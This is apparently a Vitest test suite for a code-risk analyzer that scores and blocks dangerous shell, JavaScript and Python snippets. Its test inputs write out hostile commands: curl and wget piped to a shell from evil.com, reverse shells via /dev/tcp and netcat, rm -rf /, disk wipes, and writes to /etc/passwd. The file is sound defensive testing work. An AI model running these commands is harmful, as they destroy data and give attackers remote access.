import { describe, it, expect } from 'vitest';
import { analyzeCodeRisk } from './code-analyzer.js';

describe('analyzeCodeRisk', () => {
  describe('safe code', () => {
    it('returns safe level for harmless code with no patterns', () => {
      const result = analyzeCodeRisk('const x = 1 + 2;', 'javascript');
      expect(result.level).toBe('safe');
      expect(result.score).toBe(0);
      expect(result.factors).toEqual([]);
      expect(result.blocked).toBe(false);
      expect(result.blockReason).toBeUndefined();
    });

    it('returns safe level for plain text', () => {
      const result = analyzeCodeRisk('hello world', 'javascript');
      expect(result.level).toBe('safe');
      expect(result.score).toBe(0);
      expect(result.factors).toHaveLength(0);
    });

    it('returns safe level for empty string', () => {
      const result = analyzeCodeRisk('', 'javascript');
      expect(result.level).toBe('safe');
      expect(result.score).toBe(0);
    });
  });

  describe('critical patterns (Layer 1 blocking)', () => {
    it('blocks rm -rf / (force recursive delete from root)', () => {
      const result = analyzeCodeRisk('rm -rf /', 'shell');
      expect(result.level).toBe('critical');
      expect(result.score).toBe(100);
      expect(result.blocked).toBe(true);
      expect(result.blockReason).toBeDefined();
      expect(result.factors).toHaveLength(1);
      expect(result.factors[0]!.severity).toBe('critical');
    });

    it('blocks rm -r -f / with separate flags', () => {
      const result = analyzeCodeRisk('rm -r -f /', 'shell');
      expect(result.blocked).toBe(true);
      expect(result.level).toBe('critical');
    });

    it('blocks mkfs commands', () => {
      const result = analyzeCodeRisk('mkfs.ext4 /dev/sda1', 'shell');
      expect(result.blocked).toBe(true);
      expect(result.level).toBe('critical');
    });

    it('blocks dd disk overwrite', () => {
      const result = analyzeCodeRisk('dd if=/dev/zero of=/dev/sda', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks shutdown commands', () => {
      const result = analyzeCodeRisk('shutdown -h now', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks reboot commands', () => {
      const result = analyzeCodeRisk('reboot now', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks writing to /etc/passwd', () => {
      const result = analyzeCodeRisk('echo "x" > /etc/passwd', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks writing to /etc/shadow', () => {
      const result = analyzeCodeRisk('cat something > /etc/shadow', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks Windows format commands', () => {
      const result = analyzeCodeRisk('format C:', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks Windows registry deletion', () => {
      const result = analyzeCodeRisk('reg delete HKLM\\Software\\key', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks curl piped to shell', () => {
      const result = analyzeCodeRisk('curl http://evil.com/script | sh', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks wget piped to bash', () => {
      const result = analyzeCodeRisk('wget http://evil.com/script | bash', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks reverse shell via /dev/tcp', () => {
      const result = analyzeCodeRisk('bash -i >& /dev/tcp/10.0.0.1/4242', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks netcat shell', () => {
      const result = analyzeCodeRisk('nc -e /bin/sh 10.0.0.1 4242', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks chmod 777 on root', () => {
      const result = analyzeCodeRisk('chmod 777 /', 'shell');
      expect(result.blocked).toBe(true);
    });

    it('blocks critical patterns regardless of language parameter', () => {
      // Critical patterns are checked via checkCriticalPatterns before language filtering
      const result = analyzeCodeRisk('rm -rf /', 'javascript');
      expect(result.blocked).toBe(true);
      expect(result.level).toBe('critical');
    });

    it('includes block reason from critical pattern description', () => {
      const result = analyzeCodeRisk('rm -rf /', 'shell');
      expect(result.blockReason).toMatch(/delete|force/i);
    });
  });

  describe('high risk patterns', () => {
    it('detects process.env access in JavaScript', () => {
      const result = analyzeCodeRisk('const key = process.env.API_KEY;', 'javascript');
      expect(result.level).toBe('medium');
      // process.env score is 25, which is >= 15 (medium) but < 30 (high)
      expect(result.score).toBe(25);
      expect(result.blocked).toBe(false);
      expect(result.factors.some((f) => f.description.includes('Environment variable'))).toBe(true);
    });

    it('detects child_process require in JavaScript', () => {
      const result = analyzeCodeRisk('const cp = require("child_process");', 'javascript');
      expect(result.score).toBe(30);
      expect(result.level).toBe('high');
      expect(result.factors.some((f) => f.description.includes('Child process'))).toBe(true);
    });

    it('detects child_process import in JavaScript', () => {
      const result = analyzeCodeRisk('import { exec } from "child_process";', 'javascript');
      expect(result.score).toBeGreaterThanOrEqual(30);
      expect(result.level).toBe('high');
    });

    it('detects subprocess in Python', () => {
      const result = analyzeCodeRisk('import subprocess\nsubprocess.run(["ls"])', 'python');
      expect(result.score).toBeGreaterThanOrEqual(30);
      expect(result.level).toBe('high');
      expect(result.factors.some((f) => f.description.includes('Subprocess'))).toBe(true);
    });

    it('detects os.system in Python', () => {
      const result = analyzeCodeRisk('os.system("ls -la")', 'python');
      expect(result.score).toBeGreaterThanOrEqual(30);
      expect(result.level).toBe('high');
    });

    it('detects os.popen in Python', () => {
      const result = analyzeCodeRisk('os.popen("cat /etc/hosts")', 'python');
      expect(result.score).toBeGreaterThanOrEqual(30);
    });

    it('detects eval() in JavaScript', () => {
      const result = analyzeCodeRisk('eval("alert(1)")', 'javascript');
      expect(result.score).toBe(25);
      expect(result.factors.some((f) => f.description.includes('Dynamic code evaluation'))).toBe(
        true
      );
    });

    it('detects eval() in Python', () => {
      const result = analyzeCodeRisk('eval("1 + 2")', 'python');
      expect(result.score).toBe(25);
    });

    it('detects exec() in JavaScript', () => {
      const result = analyzeCodeRisk('exec("some code")', 'javascript');
      expect(result.score).toBe(25);
      expect(result.factors.some((f) => f.description.includes('Dynamic code execution'))).toBe(
        true
      );
    });

    it('detects fs write operations in JavaScript', () => {
      const result = analyzeCodeRisk('fs.writeFile("/tmp/out.txt", data)', 'javascript');
      expect(result.factors.some((f) => f.description.includes('Filesystem write'))).toBe(true);
    });

    it('detects fs.unlink in JavaScript', () => {
      const result = analyzeCodeRisk('fs.unlink("/tmp/file.txt")', 'javascript');
      expect(result.factors.some((f) => f.description.includes('Filesystem write'))).toBe(true);
    });

    it('detects file write mode in Python', () => {
      const result = analyzeCodeRisk('open("/tmp/out.txt", "w")', 'python');
      expect(result.factors.some((f) => f.description.includes('File write mode'))).toBe(true);
    });

    it('detects shutil operations in Python', () => {
      const result = analyzeCodeRisk('shutil.rmtree("/tmp/dir")', 'python');
      expect(result.factors.some((f) => f.description.includes('File system manipulation'))).toBe(
        true
      );
    });

    it('detects ctypes in Python', () => {
      const result = analyzeCodeRisk('import ctypes', 'python');
      expect(result.factors.some((f) => f.description.includes('C-level API'))).toBe(true);
    });
  });

  describe('medium risk patterns', () => {
    it('detects fetch() in JavaScript', () => {
      const result = analyzeCodeRisk('fetch("https://api.example.com")', 'javascript');
      expect(result.score).toBe(15);
      expect(result.level).toBe('medium');
      expect(result.factors.some((f) => f.description.includes('Network request'))).toBe(true);
    });

    it('detects requests.get in Python', () => {
      const result = analyzeCodeRisk('requests.get("https://example.com")', 'python');
      expect(result.score).toBe(15);
      expect(result.level).toBe('medium');
    });

    it('detects urllib in Python', () => {
      const result = analyzeCodeRisk('import urllib\nurllib.request.urlopen(url)', 'python');
      expect(result.level).toBe('medium');
    });

    it('detects curl in shell', () => {
      const result = analyzeCodeRisk('curl https://example.com', 'shell');
      expect(result.level).toBe('medium');
      expect(result.factors.some((f) => f.description.includes('curl'))).toBe(true);
    });

    it('detects wget in shell', () => {
      const result = analyzeCodeRisk('wget https://example.com/file.tar.gz', 'shell');
      expect(result.level).toBe('medium');
      expect(result.factors.some((f) => f.description.includes('wget'))).toBe(true);
    });

    it('detects fs require in JavaScript', () => {
      const result = analyzeCodeRisk('const fs = require("fs");', 'javascript');
      expect(result.factors.some((f) => f.description.includes('Filesystem module'))).toBe(true);
    });

    it('detects fs import in JavaScript', () => {
      const result = analyzeCodeRisk('import fs from "fs";', 'javascript');
      expect(result.factors.some((f) => f.description.includes('Filesystem import'))).toBe(true);
    });

    it('detects socket operations', () => {
      const result = analyzeCodeRisk('const s = new socket()', 'javascript');
      expect(result.factors.some((f) => f.description.includes('Socket'))).toBe(true);
    });

    it('detects npm install in shell', () => {
      const result = analyzeCodeRisk('npm install malicious-package', 'shell');
      expect(result.factors.some((f) => f.description.includes('Package installation'))).toBe(true);
    });

    it('detects pip install in shell', () => {
      const result = analyzeCodeRisk('pip install some-package', 'shell');
      expect(result.factors.some((f) => f.description.includes('Pip installation'))).toBe(true);
    });

    it('detects sudo in shell', () => {
      const result = analyzeCodeRisk('sudo apt-get update', 'shell');
      expect(result.factors.some((f) => f.description.includes('Superuser'))).toBe(true);
    });

    it('detects chmod in shell', () => {
      const result = analyzeCodeRisk('chmod +x script.sh', 'shell');
      expect(result.factors.some((f) => f.description.includes('Permission change'))).toBe(true);
    });

    it('detects chown in shell', () => {
      const result = analyzeCodeRisk('chown root:root file.txt', 'shell');
      expect(result.factors.some((f) => f.description.includes('Ownership change'))).toBe(true);
    });
  });

  describe('low risk patterns', () => {
    // NOTE: Low risk patterns have score: 0, so scoreToLevel(0) returns 'safe'.
    // The factors are present with severity 'low', but the overall level is 'safe'
    // because the threshold for 'low' level is score >= 1.

    it('detects console.log in JavaScript', () => {
      const result = analyzeCodeRisk('console.log("hello")', 'javascript');
      expect(result.level).toBe('safe'); // score 0 => safe level
      expect(result.score).toBe(0);
      expect(result.factors.some((f) => f.description.includes('Console output'))).toBe(true);
      expect(result.factors.some((f) => f.severity === 'low')).toBe(true);
    });

    it('detects console.warn in JavaScript', () => {
      const result = analyzeCodeRisk('console.warn("warning")', 'javascript');
      expect(result.factors.some((f) => f.description.includes('Console output'))).toBe(true);
    });

    it('detects console.error in JavaScript', () => {
      const result = analyzeCodeRisk('console.error("error")', 'javascript');
      expect(result.factors.some((f) => f.description.includes('Console output'))).toBe(true);
    });

    it('detects print() in Python', () => {
      const result = analyzeCodeRisk('print("hello")', 'python');
      expect(result.level).toBe('safe'); // score 0 => safe level
      expect(result.score).toBe(0);
      expect(result.factors.some((f) => f.description.includes('Print output'))).toBe(true);
    });

    it('detects echo in shell', () => {
      const result = analyzeCodeRisk('echo hello', 'shell');
      expect(result.level).toBe('safe'); // score 0 => safe level
      expect(result.score).toBe(0);
      expect(result.factors.some((f) => f.description.includes('Echo output'))).toBe(true);
    });

    it('detects JSON operations in JavaScript', () => {
      const result = analyzeCodeRisk('JSON.parse(data)', 'javascript');
      expect(result.level).toBe('safe'); // score 0 => safe level
      expect(result.factors.some((f) => f.description.includes('JSON operation'))).toBe(true);
    });

    it('detects Math operations in JavaScript', () => {
      const result = analyzeCodeRisk('Math.floor(3.7)', 'javascript');
      expect(result.level).toBe('safe'); // score 0 => safe level
      expect(result.factors.some((f) => f.description.includes('Math operation'))).toBe(true);
    });

    it('low risk factors have score 0 but still appear in factors array', () => {
      const result = analyzeCodeRisk('console.log("test")', 'javascript');
      expect(result.score).toBe(0);
      expect(result.level).toBe('safe');
      expect(result.factors.length).toBeGreaterThan(0);
      // Factors are present even though score is 0 and level is 'safe'
    });
  });

  describe('score thresholds and level mapping', () => {
    it('score 0 with no factors = safe', () => {
      const result = analyzeCodeRisk('const x = 1;', 'javascript');
      expect(result.score).toBe(0);
      expect(result.level).toBe('safe');
    });

    it('score 0 with low-risk factors = safe (low patterns have score 0)', () => {
      // Low risk patterns have score: 0, so they contribute 0 to total
      // scoreToLevel(0) returns 'safe'
      const result = analyzeCodeRisk('console.log("hi")', 'javascript');
      expect(result.score).toBe(0);
      expect(result.level).toBe('safe');
      expect(result.factors.length).toBeGreaterThan(0);
    });

    it('score in range 1-14 = low', () => {
      // fs require has score 10 => low
      const result = analyzeCodeRisk('const fs = require("fs");', 'javascript');
      expect(result.score).toBe(10);
      expect(result.level).toBe('low');
    });

    it('score in range 15-29 = medium', () => {
      // fetch has score 15
      const result = analyzeCodeRisk('fetch("https://api.example.com/data")', 'javascript');
      expect(result.score).toBe(15);
      expect(result.level).toBe('medium');
    });

    it('score >= 30 = high', () => {
      // child_process require has score 30
      const result = analyzeCodeRisk('const cp = require("child_process");', 'javascript');
      expect(result.score).toBe(30);
      expect(result.level).toBe('high');
    });

    it('score 100 = critical (only from Layer 1 blocking)', () => {
      const result = analyzeCodeRisk('rm -rf /', 'shell');
      expect(result.score).toBe(100);
      expect(result.level).toBe('critical');
      expect(result.blocked).toBe(true);
    });
  });

  describe('multiple pattern accumulation', () => {
    it('accumulates scores from multiple matched patterns', () => {
      // process.env (25) + eval (25) = 50
      const code = 'const key = process.env.SECRET; eval(key);';
      const result = analyzeCodeRisk(code, 'javascript');
      expect(result.score).toBe(50);
      expect(result.level).toBe('high');
      expect(result.factors.length).toBe(2);
    });

    it('accumulates high and medium patterns', () => {
      // fetch (15) + eval (25) = 40
      const code = 'const data = await fetch(url); eval(data);';
      const result = analyzeCodeRisk(code, 'javascript');
      expect(result.score).toBe(40);
      expect(result.level).toBe('high');
      expect(result.factors.length).toBe(2);
    });

    it('accumulates multiple medium patterns', () => {
      // curl (15) + wget (15) = 30
      const code = 'curl https://a.com && wget https://b.com';
      const result = analyzeCodeRisk(code, 'shell');
      expect(result.score).toBe(30);
      expect(result.level).toBe('high');
    });

    it('accumulates low-score patterns without increasing level', () => {
      // console.log (0) + JSON.parse (0) + Math.floor (0) = 0
      const code = 'console.log(JSON.parse(data)); Math.floor(3.7);';
      const result = analyzeCodeRisk(code, 'javascript');
      expect(result.score).toBe(0);
      expect(result.factors.length).toBe(3);
    });

    it('accumulates many patterns in complex Python code', () => {
      // subprocess (30) + os.system (30) + eval (25) = 85
      const code = 'import subprocess\nos.system("ls")\neval("code")';
      const result = analyzeCodeRisk(code, 'python');
      expect(result.score).toBe(85);
      expect(result.level).toBe('high');
      expect(result.factors.length).toBe(3);
    });
  });

  describe('score capping at 99 for non-critical', () => {
    it('caps accumulated score at 99', () => {
      // subprocess (30) + os.system (30) + os.popen (30) + eval (25) + exec (25) = 140 => capped at 99
      const code = 'import subprocess\nos.system("x")\nos.popen("y")\neval("z")\nexec("w")';
      const result = analyzeCodeRisk(code, 'python');
      expect(result.score).toBe(99);
      expect(result.level).toBe('high');
      expect(result.blocked).toBe(false);
    });

    it('score 100 is reserved exclusively for critical/blocked', () => {
      // Even with many high-risk patterns, non-critical max is 99
      const code = [
        'import subprocess',
        'import ctypes',
        'os.system("a")',
        'os.popen("b")',
        'eval("c")',
        'exec("d")',
        'open("e", "w")',
        'shutil.rmtree("f")',
        'requests.get("g")',
      ].join('\n');
      const result = analyzeCodeRisk(code, 'python');
      expect(result.score).toBeLessThanOrEqual(99);
      expect(result.blocked).toBe(false);
    });
  });

  describe('language filtering', () => {
    it('does not match Python subprocess pattern in JavaScript', () => {
      const result = analyzeCodeRisk('subprocess.run(["ls"])', 'javascript');
      // subprocess is Python-only, should not appear in JS factors
      expect(result.factors.some((f) => f.description.includes('Subprocess'))).toBe(false);
    });

    it('does not match JavaScript process.env in Python', () => {
      const result = analyzeCodeRisk('const key = process.env.SECRET;', 'python');
      expect(result.factors.some((f) => f.description.includes('Environment variable'))).toBe(
        false
      );
    });

    it('does not match JavaScript process.env in shell', () => {
      const result = analyzeCodeRisk('process.env.HOME', 'shell');
      expect(result.factors.some((f) => f.description.includes('Environment variable'))).toBe(
        false
      );
    });

    it('does not match shell curl in JavaScript', () => {
      const result = analyzeCodeRisk('curl https://example.com', 'javascript');
      expect(result.factors.some((f) => f.description.includes('curl'))).toBe(false);
    });

    it('does not match shell curl in Python', () => {
      const result = analyzeCodeRisk('curl https://example.com', 'python');
      expect(result.factors.some((f) => f.description.includes('curl'))).toBe(false);
    });

    it('does not match Python requests.get in JavaScript', () => {
      const result = analyzeCodeRisk('requests.get("https://example.com")', 'javascript');
      expect(result.factors.some((f) => f.description.includes('HTTP request'))).toBe(false);
    });

    it('does not match JavaScript console.log in Python', () => {
      const result = analyzeCodeRisk('console.log("test")', 'python');
      expect(result.factors.some((f) => f.description.includes('Console output'))).toBe(false);
    });

    it('does not match shell echo in JavaScript', () => {
      const result = analyzeCodeRisk('echo hello', 'javascript');
      expect(result.factors.some((f) => f.description.includes('Echo output'))).toBe(false);
    });

    it('matches cross-language patterns (eval in both JS and Python)', () => {
      const jsResult = analyzeCodeRisk('eval("code")', 'javascript');
      const pyResult = analyzeCodeRisk('eval("code")', 'python');
      expect(jsResult.factors.some((f) => f.description.includes('Dynamic code evaluation'))).toBe(
        true
      );
      expect(pyResult.factors.some((f) => f.description.includes('Dynamic code evaluation'))).toBe(
        true
      );
    });

    it('matches socket pattern in both JavaScript and Python', () => {
      const jsResult = analyzeCodeRisk('new socket()', 'javascript');
      const pyResult = analyzeCodeRisk('socket.connect()', 'python');
      expect(jsResult.factors.some((f) => f.description.includes('Socket'))).toBe(true);
      expect(pyResult.factors.some((f) => f.description.includes('Socket'))).toBe(true);
    });
  });

  describe('shell-specific patterns', () => {
    it('detects curl command', () => {
      const result = analyzeCodeRisk('curl -X POST https://api.com/data', 'shell');
      expect(result.factors.some((f) => f.description.includes('curl'))).toBe(true);
    });

    it('detects wget command', () => {
      const result = analyzeCodeRisk('wget -q https://releases.example.com/v2.tar.gz', 'shell');
      expect(result.factors.some((f) => f.description.includes('wget'))).toBe(true);
    });

    it('detects npm install', () => {
      const result = analyzeCodeRisk('npm install express', 'shell');
      expect(result.factors.some((f) => f.description.includes('Package installation'))).toBe(true);
    });

    it('detects npm i shorthand', () => {
      const result = analyzeCodeRisk('npm i lodash', 'shell');
      expect(result.factors.some((f) => f.description.includes('Package installation'))).toBe(true);
    });

    it('detects pip install', () => {
      const result = analyzeCodeRisk('pip install numpy', 'shell');
      expect(result.factors.some((f) => f.description.includes('Pip installation'))).toBe(true);
    });

    it('detects sudo command', () => {
      const result = analyzeCodeRisk('sudo systemctl restart nginx', 'shell');
      expect(result.factors.some((f) => f.description.includes('Superuser'))).toBe(true);
      expect(result.score).toBe(20);
    });

    it('detects chmod command', () => {
      const result = analyzeCodeRisk('chmod 755 deploy.sh', 'shell');
      expect(result.factors.some((f) => f.description.includes('Permission change'))).toBe(true);
    });

    it('detects chown command', () => {
      const result = analyzeCodeRisk('chown www-data:www-data /var/www', 'shell');
      expect(result.factors.some((f) => f.description.includes('Ownership change'))).toBe(true);
    });

    it('accumulates multiple shell risks', () => {
      // sudo (20) + curl (15) + chmod (10) = 45
      const code = 'sudo curl https://example.com/install.sh && chmod +x install.sh';
      const result = analyzeCodeRisk(code, 'shell');
      expect(result.score).toBe(45);
      expect(result.level).toBe('high');
      expect(result.factors.length).toBe(3);
    });
  });

  describe('return type structure', () => {
    it('returns all required fields for safe code', () => {
      const result = analyzeCodeRisk('const x = 1;', 'javascript');
      expect(result).toHaveProperty('level');
      expect(result).toHaveProperty('score');
      expect(result).toHaveProperty('factors');
      expect(result).toHaveProperty('blocked');
      expect(typeof result.level).toBe('string');
      expect(typeof result.score).toBe('number');
      expect(Array.isArray(result.factors)).toBe(true);
      expect(typeof result.blocked).toBe('boolean');
    });

    it('returns all required fields for critical code', () => {
      const result = analyzeCodeRisk('rm -rf /', 'shell');
      expect(result).toHaveProperty('level');
      expect(result).toHaveProperty('score');
      expect(result).toHaveProperty('factors');
      expect(result).toHaveProperty('blocked');
      expect(result).toHaveProperty('blockReason');
      expect(typeof result.blockReason).toBe('string');
    });

    it('factor objects have correct shape', () => {
      const result = analyzeCodeRisk('fetch("https://api.com")', 'javascript');
      expect(result.factors.length).toBeGreaterThan(0);
      const factor = result.factors[0]!;
      expect(factor).toHaveProperty('pattern');
      expect(factor).toHaveProperty('description');
      expect(factor).toHaveProperty('severity');
      expect(typeof factor.pattern).toBe('string');
      expect(typeof factor.description).toBe('string');
      expect(['safe', 'low', 'medium', 'high', 'critical']).toContain(factor.severity);
    });

    it('non-blocked results do not have blockReason', () => {
      const result = analyzeCodeRisk('fetch("https://api.com")', 'javascript');
      expect(result.blocked).toBe(false);
      expect(result.blockReason).toBeUndefined();
    });
  });
});
